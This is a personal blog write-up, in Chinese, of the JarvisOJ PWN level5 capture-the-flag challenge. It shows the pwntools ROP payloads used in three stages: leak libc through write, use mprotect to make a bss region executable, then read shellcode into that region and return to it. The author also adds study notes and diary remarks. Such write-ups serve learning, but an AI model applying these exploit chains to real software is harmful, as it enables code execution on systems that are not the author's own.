---
title: JarvisOJ_PWN_Level5
date: 2019-11-21 18:42:16
tags:
- Sec
- CTF
- PWN
- JarvisOJ
categories:
- Sec
- CTF
- PWN
---
# 前言 #
和level3_x64的文件是一样的，不同的地方在于，这里假设不让使用system函数和execve函数。

题目提示了可以用mmap或mprotect。

嗯，两个听都没听过的东西。。。

直接找题解吧つ﹏⊂


**前排提醒，文章记录很乱，大概率对别人没什么帮助。愿意看就点下面吧，做好右上角的准备**
<!-- more -->

# 题解 #

大致看了下，这两个函数，觉得有点看的不是太懂。。。

（**以下感觉不太对，算是自己理解的，准确的还是应该查下网上的内容**）*
mmap好像是使一段文件和内存建立连接，修改其中一个，另一个也会发生改变。*

*mprotect的话，好像是修改一段区间的权限。权限表示方式好像和chmod一样*

看的题解好像都是使用的mprotect。
## 方法一 ##
### 第一步 ###
和之前一样，先输出write在内存中的地址。然后计算出offset.这样可以使用libc.so里的内容。
*(11.22留)*和level3一样，利用两个gadget，先输出了write_got，这样可以计算出偏移量，然后，可以利用so文件里面的gadget。使用ROPgadget在so文件里搜索'pop|ret'可以发现，存在pop rdx。
这样可以直接通过构造三个gadget来实现三个参数及其以内的函数调用.

    p1 = pad + p64(prdi) + p64(1)
 
    p1+= p64(prsi) + p64(write_got)
 
    p1+= '1' * 8 + p64(write_addr) + p64(addr_start)
这里的addr_start可以是vulnerable_function的地址
也可以是_start的地址。后者是从一篇WP里看到的，好像是以main函数为参数的函数，是程序的入口函数。
但感觉加上测试，vulnerable_funct的地址也可以。

### 第二步 ###
使用mprotect修改bss段的一段区间的权限，改为7.好像命令是以chmod的形式给出。
*（11.22留）*
个人觉得先修改权限比较合适，看起来像是修改了大段的地址，但是只利用了其中一小部分，看了下自动生成的len(shellcode)=48

    p2 = pad + p64(prdi) 
    p2+= p64(0x00600000) + p64(prsi) + p64(0x1000) + 'p2p2p2p2'
    p2+= p64(prdx) + p64(7) + p64(libc_mpro)
    p2+= p64(addr_start)


### 第三步 ###

找到bss地址，把shellcode写入到bss地址里。然后ret到shellcode上，开始执行代码
*11.22留:*

    p3 = pad + p64(prdi) + p64(0)
    p3+= p64(prsi) + p64(bss_addr+0x500) + 'deadbeef' 
    p3+= p64(prdx) + p64(0x100)
    p3+= p64(e.symbols['read'])
    p3+= p64(bss_addr + 0x500)

用read函数，确定一段地址后把shellcode写入进去，然后在ret里，再跳回这段地址，就可以正常执行了。
这里比较需要注意的点应该是要设置产生64位的shellcode，之前32位的一直不成功。。。设置了context.binary或者context.arch后就可以了


# 总结 #
这应该是写的最少的一次报告。

状态没那么好，真让我总结技术点，实在不知道总结些什么好。。。扯点场外：

题目是上午上课时写的，中午和下午一直在调程序，主要之前写的程序都属于自娱自乐的玩具，真的要发挥些作用时就发现，问题不少。比如，我连使用异常处理的习惯都没有，导致程序报错时直接崩溃了。再或者程序运行着忽然就卡住不动了，可能和资源释放有关系、也可能和timeout有关，结果就一直在看着程序跑。。。事后感觉，好蠢哦0.0 。。。应该放着程序跑，然后设定异常时警告之类的方法，然后专心做别的事，让人来监视着程序跑几个小时，emmm，好蠢0.0

【*11.22留*
今天没做新题，昨天只是把这一题给大致流程学习了下，但是没有自己动手写。今天一个白天都在调乱七八糟的小程序，越发觉得大坑都是一步一步跳进去的0.0
晚上去上课觉得还是要动手把这题写下，顺便像昨天那样的程序实在不忍心看，今天再修改吧。。。
这题还有一种很巧妙的解法，是利用了一连串pop和call加jnz的。觉得也特别巧妙，之后有时间把这种解法补上来】

有可能这篇报告会修改，但今天就先这样发着吧~*美其名曰，真实的记录学习过程つ﹏⊂*~


**：人一我百，人十我万，永不放弃，加油！**